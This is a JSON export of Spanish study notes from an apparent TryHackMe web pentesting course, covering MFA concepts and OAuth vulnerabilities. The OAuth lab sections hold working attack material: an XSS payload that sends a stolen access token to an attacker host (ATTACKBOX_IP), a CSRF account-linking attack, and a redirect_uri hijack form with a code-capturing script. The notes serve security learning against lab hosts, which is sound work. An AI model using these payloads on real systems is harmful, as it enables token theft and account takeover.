[
  {
    "title": "1. How MFA Works",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/5-multi-factor-authentication/1-how-mfa-works/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/5. Multi-Factor Authentication/1. How MFA Works.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 5. Multi-Factor Authentication",
    "content": "En la era de la tecnología, conservar nuestra información sensible y sistemas seguros es más importante que nunca. La Autentificación Multi Factor (MFA) añade protección extra para las cuentas de usuario requiriendo que ofrezcas dos o más métodos de verificación.\n\n>[!NOTE] 2FA es un subtipo de MFA.\n\n----------------------------------\n<h2>Tipos de Factores de Autentificación</h2>\nMFA típicamente combina dos o más tipos de credenciales de las categorías:\n\n- Algo que sabes.\n- Algo que tienes.\n- Algo que eres.\n- Algún sitio donde estás.\n- Algo que haces.\n\n![[Pasted image 20251223201529.png]]\n\n<h4>Algo que Sabes</h4>\nPodría ser una contraseña, PIN o cualquier otra pieza de información que tengas que recordar. Forma la base de la mayoría de sistemas de autentificación pero puede ser vulnerable usada individualmente.\n<h4>Algo que Tienes</h4>\nPodría ser tu teléfono con una aplicación de autentificación, un token de seguridad o incluso una tarjeta. Últimamente se están viendo más certificados de clientes, que son como IDs digitales para dispositivos.\n<h4>Algo que Eres</h4>\nInvolucra las medidas biométricas, como huellas, reconocimiento facial o de iris. Está ganando popularidad porque es difícil falsificarla. \n<h4>Algún Sitio en el que Estás</h4>\nInvolucra tu dirección IP de origen o geolocalización. Algunas aplicaciones como la banca online, restringen la actividad si detectan que estás haciendo la petición desde una dirección IP desconocida.\n<h4>Algo que Haces</h4>\nEs normalmente usada en aplicaciones que restringen la interacción de bots, como páginas de registro. La app analiza la forma en la que el usuario introduce credenciales o mueve su ratón.\n\n----------------------------------------------\n<h2>Tipos de 2FA</h2>\n2FA requiere exactamente 2 tipos de los anteriores, por lo que todo 2FA es un MFA pero no cualquier MFA es un 2FA. Algunos de los métodos más comunes incluyen:\n\n<h4>Time-Based One-Time Passwords</h4>\nSon contraseñas temporales que cambian cada 30 segundos o así. Aplicaciones como Google Authenticator, Microsoft Authenticator y Authy los usan, haciéndolo duro para los hackers de interceptar o reutilizar.\n<h4>Notificaciones Push</h4>\nAplicaciones como Duo o Google Prompt mandan una petición de inicio de sesión directamente a tu teléfono. Puedes aprobar o denegar el acceso correctamente desde tu dispositivo, añadiendo una capa de seguridad que verifica la posesión del dispositivo registrado.\n\nUn ataque sobre las notificaciones push (ataque de fatiga MFA) permitió a un atacante comprometer la cuenta de un empleado de Uber. Investiga más sobre ello [aquí](https://www.uber.com/newsroom/security-update).\n<h4>SMS</h4>\nLa mayoría de aplicaciones actualmente usan este método. El sistema manda un mensaje con un código de un solo uso al móvil registrado del usuario. Aunque conveniente, es menos segura debido a vulnerabilidades asociadas con la intercepción de mensajes de texto.\n<h4>Tokens de Hardware</h4>\nDispositivos como las YubiKeys generan un código de un uso o usan NFC para autentificarse. Son geniales porque no necesitan red o batería, por lo que generalmente funcionan offline.\n\n----------------------------------------\n<h2>Acceso Condicional</h2>\nEl acceso condicional es usado típicamente por compañías para ajustar sus requerimientos de autentificación basado en diferentes contextos. Es como un árbol de decisiones que dispara medidas extra de seguridad dependiendo de ciertos factores.\n\n<h4>Basado en Localización</h4>\n\n<h4>Basado en Tiempo</h4>\n\n<h4>Análisis de Comportamiento</h4>\n\n<h4>Específico de Dispositivo</h4>\n\n\n-------------------------------------\n<h2>Adopción Global e Impulso Regulatorio</h2>",
    "modified": "2025-12-24T00:53:35"
  },
  {
    "title": "8. Other Vulnerabilities and Evolution of OAuth 2.1",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/4-oauth-vulnerabilities/8-other-vulnerabilities-and-evolution-of-oauth-2-1/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/4. OAuth Vulnerabilities/8. Other Vulnerabilities and Evolution of OAuth 2.1.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 4. OAuth Vulnerabilities",
    "content": "Aparte de las vulnerabilidades previamente vistas, los atacantes pueden explotar otras varias debilidades críticas en las implementaciones OAuth. Las siguientes son algunas vulnerabilidades adicionales que los pentesters deberían tener en cuenta.\n\n---------------------------------------------\n<h2>Expiración de Token Insuficiente</h2>\nLos tokens de acceso con un amplio o infinito tiempo de expiración suponen un riesgo importante. Si un atacante obtiene dicho token, pueden acceder a recursos protegidos indefinidamente. Implementar tokens con poco tiempo de acceso mitiga este problema.\n\n-----------------------------------------\n<h2>Ataques de Replay</h2>\nInvolucran capturar tokens válidos y reutilizarlos para ganar acceso no autorizado. Los atacantes pueden explotar estos tokens múltiples veces sin mecanismos para detectar y prevenir reuso de tokens. Implementar valores `nonce` y comprobaciones `timestamp` puede ayudar a mitigar este tipo de ataques asegurando que cada token sólo se utiliza una vez.\n\n--------------------------------------------\n<h2>Almacenamiento Inseguro de Tokens</h2>\nEsto puede llevar a robo de tokens y acceso no autorizado. Usar mecanismos de guardado de tokens seguros, como cookies seguras o bases de datos encriptadas, puede ayudar a proteger el token de ser obtenido por actores maliciosos.\n\n---------------------------------\n<h2>Evolución de OAuth 2.1</h2>\nOAuth 2.1 representa la última iteración en la evolución del estándar OAuth, construido con OAuth 2.0 como base para mejorar la seguridad. La travesía de OAuth 2.0 a OAuth 2.1 ha estado marcada por la necesidad de mitigar vulnerabilidades conocidas e incorporar las mejores prácticas que pueden emerger desde que la especificación original se publicó.\n<h4>Cambios Importantes</h4>\nOAuth introduce varios cambios clave que buscan fortalecer el protocolo.\n\n- Obsolescencia de `implicit grant type`.\n- Exigencia de uso del parámetro `state`.\n- Enfatiza la importancia de manejar y almacenar los tokens de forma segura.\n- Ofrece guías más claras para la validación de la URI de redirección.",
    "modified": "2025-12-24T00:53:35"
  },
  {
    "title": "7. Exploiting OAuth - Implicit Grant Flow",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/4-oauth-vulnerabilities/7-exploiting-oauth-implicit-grant-flow/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/4. OAuth Vulnerabilities/7. Exploiting OAuth - Implicit Grant Flow.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 4. OAuth Vulnerabilities",
    "content": "EN el flujo de permiso implícito, los tokens se devuelven directamente al cliente via navegador sin requerir ningún código de autorización . Este flujo es principalmente usado por aplicaciones de una sola página y está diseñado para clientes públicos que no pueden almacenar de forma segura secretos de clientes. Sin embargo, este flujo tiene vulnerabilidades inherentes.\n\n------------------------------------------\n<h2>Debilidades</h2>\n- **Exponer Tokens de Acceso en la URL:** La aplicación redirige al usuario al endpoint de autorización OAuth, el cual devuelve el token de acceso en el fragmento URI. Cualquier script que corra en la página puede acceder a este fragmento.\n- **Validar Inadecuadamente las URIs de Redirección:** El servidor OAuth no valida adecuadamente las URIs de redirección, permitiendo a ataques manipular el endpoint de redirección.\n- **HTTPS sin Implementar:** La aplicación no aplica HTTPS, lo que puede llevara intercepción del token mediante ataques MITM.\n- **Manejo Inadecuado de Tokens de Acceso:** La aplicación guarda el token de acceso de forma insegura, posiblemente en `localStorage` o `sessionStorage`, haciéndolo vulnerable a ataques XSS.\n\n-------------------------------------------\n<h2>Obsolescencia del Flujo de Permiso Implícito</h2>\nDebido a estas vulnerabilidades, el framework de [Mejor Práctica Actual respecto a OAuth 2.0](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics) recomienda dejar de utilizar el flujo de permiso implícito en favor del código de autorización con [Prueba Clave del Intercambio de Código (PKCE)](https://auth0.com/docs/get-started/authentication-and-authorization-flow/authorization-code-flow-with-pkce). Este flujo mejorado permite seguridad mejorada mitigando los riesgos de la exposición del token y la falta de autentificación del cliente.\n\n------------------------------\n<h2>Práctica</h2>\n>[!CAUTION] Antes de empezar con el ejercicio asegúrate de tener la sesión cerrada visitando http://coffee.thm:8000/admin/logout.\n\nVisita `http://factbook.thm:8080`, donde verás una página que permite sincronizar tus estados de `CoffeeShopApp`. El proceso de autorización empezará una vez que hagas click en el botón \"Sync Statuses from CoffeeShopApp\". La aplicación cliente está configurada para usar el tipo de permiso implícito, lo que significa que el token de acceso será directamente devuelto al cliente. La URL de autorización se construye así:\n\n```javascript\nvar client_id = 'npmL7WDiRoOvjZoGSDiJhU2ViodTdygjW8rdabt7';\nvar redirect_uri = 'http://factbook.thm:8080/callback.php'; \nvar auth_url = \"http://coffee.thm:8000/o/authorize/\";\nvar url = auth_url + \"?response_type=token&client_id=\" + client_id + \"&redirect_uri=\" + encodeURIComponent(redirect_uri);\nwindow.location.href = url;\n```\n\n-------------------------------------\n<h2>Perspectiva de la Víctima</h2>\nUna vez que el usuario se identifica usando el proveedor de OAuth con las credenciales `victim:victim123`, será redirigido a `callback.php`, donde puede introducir un estado. Esta página incluye un formulario para introducir estados y subirlos vía una petición AJAX.\n\n```html\n<button class=\"btn btn-primary\" onclick=\"submitStatus()\">Submit</button>\n<h2 class=\"mt-4\">Submitted Status</h2>\n<ul class=\"list-group\" id=\"status-list\">\n    <?php\n    session_start();\n    if (isset($_POST['status'])) {\n        $status = $_POST['status'];\n        if (!isset($_SESSION['statuses'])) {\n            $_SESSION['statuses'] = [];\n        }\n        $_SESSION['statuses'][] = $status;\n        header('Content-Type: application/json');\n        echo json_encode(['status' => $status]);\n        exit();\n    }\n    // Display previously stored statuses\n    if (isset($_SESSION['statuses'])) {\n        foreach ($_SESSION['statuses'] as $status) {\n            echo '<li class=\"list-group-item\">' . $status . '</li>';\n        }\n    }\n    ?>\n</ul>\n```\n\nCon propósitos de demostración, el campo de input de estado es vulnerable a XSS. Una vez alcances la página de estado e introduzcas un estado como \"Hello\", será publicado. Sin embargo, si un atacante explota esta vulnerabilidad, puede inyectar un script malicioso.\n\n![[Pasted image 20251223171441.png]]\n\n-------------------------------------------\n<h2>Perspectiva del Atacante</h2>\nPara prepararte para el ataque, corre un servidor Python usando `python3 -m http.server 8081`. Si te salta un error de puerto en uso, usa otro. El atacante compartirá el siguiente payload con la víctima el cual introdujo como estado:\n\n```javascript\n<script>var hash = window.location.hash.substr(1);var result = hash.split('&').reduce(function (res, item) {var parts = item.split('=');res[parts[0]] = parts[1];\n    return res;\n  }, {});\n  var accessToken = result.access_token;\n    var img = new Image();\n    img.src = 'http://ATTACKBOX_IP:8081/steal_token?token=' + accessToken;\n</script>\n```\n\nVeamos el payload:\n\n- Comienza extrayendo el fragmento identificador de la URL, que es la parte de la URL que sigue al símbolo `#`. Elimina `#` usando `substr(1)`.\n- Esta string se parte por `&` para separar los pares de clave-valor. La función `reduce` procesa cada uno de estos pares, partiéndolos por `=` para aislar las claves y los valores. Y se guardan dichos pares.\n- El script extrae el valor `access_token` y lo asigna a la variable `accessToken`. Para exfiltrar este token de acceso, el script crea un nuevo Objeto de Imagen y configura su atributo `src` para que apunte al servidor del atacante (`http://ATTACKBOX_IP:8081/steal_token`), añadiendo el token de acceso como parámetro.\n- Cuando se carga la imagen, dispara una petición al servidor del atacante con el token robado incluido en la URL.\n\nCopia y pega el código dentro de la máquina de la víctima en el campo de status. Refresca la página si no te llega.\n\n```bash\nroot@ip-10-10-162-175:~# python3 -m http.server 8081\nServing HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...\n10.9.2.217 - - [27/Aug/2024 19:30:10] code 404, message File not found\n10.9.2.217 - - [27/Aug/2024 19:30:10] \"GET /steal_token?token=2aauviER3lUOev8wNmXQ9B4GNUoadE HTTP/1.1\" 404 -\n```",
    "modified": "2025-12-24T00:53:35"
  },
  {
    "title": "6. Exploiting OAuth - CSRF in OAuth",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/4-oauth-vulnerabilities/6-exploiting-oauth-csrf-in-oauth/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/4. OAuth Vulnerabilities/6. Exploiting OAuth - CSRF in OAuth.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 4. OAuth Vulnerabilities",
    "content": "El parámetro state en el framework OAuth protege contra ataque CSRF, que ocurren cuando un atacante engaña a un usuario para que ejecute acciones no deseadas en una aplicación web donde están siendo autentificadas. Esto puede conllevar a la divulgación de información sensible. El parámetro state permite mitigar este riesgo manteniendo la integridad del proceso de autorización.\n\n------------------------------------------------\n<h2>Vulnerabilidad de Parámetro State Débil o Flatante</h2>\nEl parámetro state es una string arbitraria que la aplicación cliente incluye en la petición de autorización. Cuando el servidor de autorización redirige al usuario de vuelta a la aplicación cliente con el código de autorización, también incluye el parámetro state. Entonces la aplicación cliente verifica que el parámetro state en la respuesta coincide con con la mandada originalmente. \n\nPor ejemplo, considera una implementación OAuth donde el parámetro state falta o es predecible. Un atacante puede iniciar un flujo OAuth y ofrecer su URI de redirección maliciosa. Después de que el usuario se autentifique y autorice a la aplicación, el servidor de autorización redirige el código de autorización a la URI controlada por el atacante, como se especifica en el parámetro state débil o faltante.\n\n--------------------------------------\n<h2>Práctica</h2>\nEn este ejercicio, exploraremos cómo la ausencia del parámetro state en el proceso de autorización OAuth puede llevar a ataques CSRF. Usaremos la app `mycontacts.thm:8080` que permite sincronizar contactos de cualquier plataforma.\n\n>[!CAUTION] Antes de empezar asegúrate de haber cerrado sesión visitando http://coffee.thm:8000/admin/logout\n\n<h4>Perspectiva del Atacante</h4>\nPrimero visita `http://mycontacts.thm:8080/csrf/index.php` con las credenciales `attacker:attacker`. Una vez que inicies sesión, verás una página que permite sincronizar contactos a `CoffeeShopApp`. Una vez que las cuentas estén sincronizadas, se transferirá todos los contactos a la cuenta `CoffeeShopApp`.\n\n![[Pasted image 20251223145428.png]]\n\nSi haces click en \"Sync Contacts\" serás redirigido a un servidor de autorización OAuth con la URL `http://coffee.thm:8000/o/authorize/?response_type=code&client_id=kwoy5pKgHOn0bJPNYuPdUL2du8aboMX1n9h9C0PN&redirect_uri=http%3A%2F%2Fcoffee.thm%2Fcsrf%2Fcallbackcsrf.php`.\n\nComo pentester, te das cuenta de que a la petición le falta, sugiriendo la posibilidad de un ataque CSRF. Aquí no necesitas sincronizar tu cuenta. Explotaremos esta vulnerabilidad para ligar la cuenta de la víctima a la del atacante.\n\n---------------------------------------\n<h2>Explotando la Vulnerabilidad</h2>\nSin el parámetro `state`, el proceso de autorización es vulnerable a CSRF. El atacante puede explotar esta vulnerabilidad obteniendo el código de autorización de la víctima y mandándolo al atacante. El servidor de autorización no tiene manera de saber si el código de autorización pertenece al atacante o la víctima y tampoco de saber si la petición viene de uno o de otro.\n\n--------------------------------------\n<h2>Preparando el Payload</h2>\nPara preparar el payload, el atacante debe obtener el código de autorización. Esto puede hacerse interceptando el proceso de autorización usando una herramienta como Burp Suite o cualquier otra. El link http://coffee.thm:8000/o/authorize/?response_type=code&client_id=kwoy5pKgHOn0bJPNYuPdUL2du8aboMX1n9h9C0PN&redirect_uri=http://coffee.thm:8000/oauthdemo/callbackforcsrf/ te permite obtener el código de autorización sin completar el flujo OAuth. El código del flujo es bastante directo como se muestra abajo:\n\n```python\ndef oauth_logincsrf(request):\n    app = Application.objects.get(name=\"ContactApp\")\n    redirect_uri = request.POST.get(\"redirect_uri\", \"http://coffee.thm/csrf/callbackcsrf.php\") \n    \n    authorization_url = (\n        f\"http://coffee.thm:8000/o/authorize/?client_id={app.client_id}&response_type=code&redirect_uri={redirect_uri}\"\n    )\n    return redirect(authorization_url)\n\ndef oauth_callbackflagcsrf(request):\n    code = request.GET.get(\"code\")\n    \n    if not code:\n        return JsonResponse({'error': 'missing_code', 'details': 'Missing code parameter.'}, status=400) \n\n    if code:\n        return JsonResponse({'code': code, 'Payload': 'http://coffee.thm/csrf/callbackcsrf.php?code='+code}, status=400) \n```\n\nObtendrás la siguiente respuesta una vez que visites dicho link para obtener el código de autorización con las credenciales `attacker:tesla@123`.\n\n![[Pasted image 20251223152748.png]]\n\nEl código de autorización de arriba permitiría a cualquier persona obtener el token. El parámetro URL en la respuesta es el payload que debemos mandar a la víctima. Copia el valor `Payload`.\n\n-------------------------------------------\n<h2>Lanzando el Ataque</h2>\n- Una vez que el atacante ha obtenido el código de autorización, puede preparar el payload CSRF. Supón que el atacante manda un email a la víctima con el link `http://bistro.thm:8080/csrf/callbackcsrf.php?code=xxxx`.\n- Después de recibir el email, si la víctima hace click en el o lo ejecuta en su navegador, (donde `xxxx` es el código de autorización del atacante), la cuenta OAuth de `CoffeShopApp` del atacante será ligada con la de la víctima, obteniendo así todos sus contactos.\n\n<h4>Perspectiva de la Víctima</h4>\n- Para comprobarlo como víctima, inicia sesión en http://bistro.thm:8080/csrf/ con las credenciales `victim:victim`. Como el código de autorización es único, ejecuta el exploit del atacante con su código de autorización pegándolo directamente en el navegador (`http://bistro.thm:8080/csrf/callbackcsrf.php?code=xxxx`).\n- Como hemos visto arriba, el mismo link mandado a la víctima es el parámetro URL recibido durante el proceso de \"Preparando el Payload\". Una vez ejecutado, el código hará una llamada para obtener el token de acceso y mandar los contactos a la cuenta del atacante.\n  \n  ![[Pasted image 20251223154633.png]]",
    "modified": "2025-12-24T00:53:35"
  },
  {
    "title": "5. Exploiting OAuth - Stealing OAuth Token",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/4-oauth-vulnerabilities/5-exploiting-oauth-stealing-oauth-token/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/4. OAuth Vulnerabilities/5. Exploiting OAuth - Stealing OAuth Token.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 4. OAuth Vulnerabilities",
    "content": "Los tokens juegan un rol crítico en el framework OAuth 2.0, actuando como claves digitales que otorgan acceso a recursos protegidos. Estos tokens son emitidos por el servidor de autorización y redirigidos a la aplicación del cliente basándose en el parámetro `redirect_uri`. Esta redirección es crucial en el flujo OAuth, asegurando que los tokens se transmiten de forma segura al receptor. Sin embargo, si el `redirect_uri` no está bien protegido, los atacantes pueden explotarlo para secuestrar tokens.\n\n---------------------------------\n<h2>Rol de Redirect_URI</h2>\nEl parámetro `redirect_uri` se especifica durante el flujo OAuth para redirigir el token desde el servidor de autorización, después de que la autorización se lleve a cabo. Esta URI debe estar preregistrada en los ajustes de la aplicación para prevenir vulnerabilidades de redirección abierta. Durante el proceso OAuth, el servidor comprueba que la `redirect_uri` proporcionada coincide con una de las registradas.\n\n---------------------------------\n<h2>Vulnerability</h2>\nUna `redirect_uri` insegura puede llevar a problemas severos de seguridad. Si los atacantes ganan control sobre cualquier dominio o URI listada en `redirect_uri`, pueden manipular el flujo para interceptar los tokens. Aquí se muestra cómo debería ser explotado:\n\n- Considera una aplicación OAuth con las siguientes URIs de redirección registradas:\n  ![[Pasted image 20251222200934.png]]\n- **Estrategia del Atacante:** Si un atacante gana control sobre `dev.bistro.thm`, pueden explotar el flujo OAuth. Configurando la `redirect_uri` a `http://dev.bistro.thm/callback`, el servidor de autorización mandará el token a este dominio controlado por él.\n- **Ataque Construido:** El atacante inicia un flujo OAuth y asegura que `redirect_uri` apunta a su dominio controlado. Después de que el usuario autorice a la aplicación, el token es mandado a `http://dev.bistro.thm/callback`. El atacante puede ahora capturar este token y usarlo para acceder a recursos protegidos.\n\n--------------------------------\n<h2>Preparando el Payload (Prespectiva del Atacante)</h2>\n>[!CAUTION] Antes de empezar el ejercicio, asegúrate de que tienes la sesión de la víctima cerrada visitando http://coffee.thm:8000/admin/logout.\n\nPara este ejercicio asumimos que el atacante ha comprometido el dominio `dev.bistro.thm:8002` y puede hostear cualquier página HTML en el servidor. Considera a Tom, una víctima a la cual se le mandará el link. El atacante puede construir una página HTML simple (`redirect_uri.html`) con el siguiente código:\n\n```html\n<form action=\"http://coffee.thm:8000/oauthdemo/oauth_login/\" method=\"get\">\n    <input type=\"hidden\" name=\"redirect_uri\" value=\"http://dev.bistro.thm:8002/malicious_redirect.html\">\n    <input type=\"submit\" value=\"Hijack OAuth\">\n</form>\n```\n\nEste formulario manda un parámetro escondido `redirect_uri` con el valor `http://dev.bistro.thm:8002/malicious_redirect.html` y subir la petición a http://coffee.thm:8000/oauthdemo/oauth_login/. La página `malicious_redirect.html` interceptaría el código de autorización de la URL usando el siguiente código:\n\n```html\n<script>\n    // Extract the authorization code from the URL\n    const urlParams = new URLSearchParams(window.location.search);\n    const code = urlParams.get('code');\n    document.getElementById('auth_code').innerText = code;\n    console.log(\"Intercepted Authorization Code:\", code);\n    // code to save the acquired code in database/file etc\n</script>\n```\n\n>[!NOTE] Como el atacante tiene control total del subdominio, una vez que redirige a una víctima, guardará las credenciales en una base de datos/archivo para usarlo después.\n\nEl atacante puede mandarle a Tom el link (http://dev.bistro.thm:8002/redirect_uri.html) mediante ingeniería social o CSRF. La víctima, inocente, hace click en el link, lo que lo lleva a `dev.bistro.thm:8002/redirect_uri.html`.\n\nAbre dicho link en la máquina virtual como \"víctima\". Verás esto:\n\n![[Pasted image 20251222202318.png]]\n\nCuando la víctima hace click en \"Login via OAuth\", el formulario llama a `http://coffee.thm:8000/oauthdemo/oauth_login/` pero con una `redirect_uri` falsificada. Una vez que la víctima introduce sus credenciales (`victim:victim123`) en el proveedor de OAuth, redirige el código de autorización OAuth a la URL (`http://dev.bistro.thm:8002/malicious_redirect.html`) controlada por el atacante, permitiéndole interceptar y usar para sus fines el código de autorización.\n\n![[Pasted image 20251222202750.png]]\n\n--------------------------------------\n<h2>Perspectiva del Atacante</h2>\nDesde la máquina del atacante, pueden utilizar el código de autorización interceptada para llamar al endpoint `/callback` e intercambiarlo por un token válido. Con este token, el atacante gana acceso no autorizado a los recursos protegidos del usuario. Para obtener este token, visita la URL http://bistro.thm:8000/oauthdemo/callbackforflag/?code=xxxx y reemplaza `code` por el código adquirido.\n\n![[Pasted image 20251222202955.png]]",
    "modified": "2025-12-24T00:53:35"
  }
]